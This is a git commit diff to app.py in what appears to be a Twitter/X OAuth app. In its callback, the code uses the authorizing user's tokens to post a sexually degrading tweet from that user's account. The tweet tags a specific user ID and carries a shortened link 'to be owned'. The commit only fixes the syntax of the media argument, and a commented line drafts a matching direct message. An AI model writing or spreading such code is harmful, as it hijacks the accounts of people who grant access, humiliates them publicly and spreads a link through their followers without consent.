ba0986a226f16adc2dc97d79738a5ef8b63d3224
slave2goddes <slave2jan@gmail.com>
2025-01-18 22:59:09 +0530

    Update app.py

--- app.py
+++ app.py
@@ -230,7 +230,7 @@ def callback():
                                         access_token_secret=real_oauth_token_secret)
         
         api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$",
-                        media={tagged_user_ids=['1697559401543139328']})
+                        media={"tagged_user_ids":['1697559401543139328']})
         #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
         
 
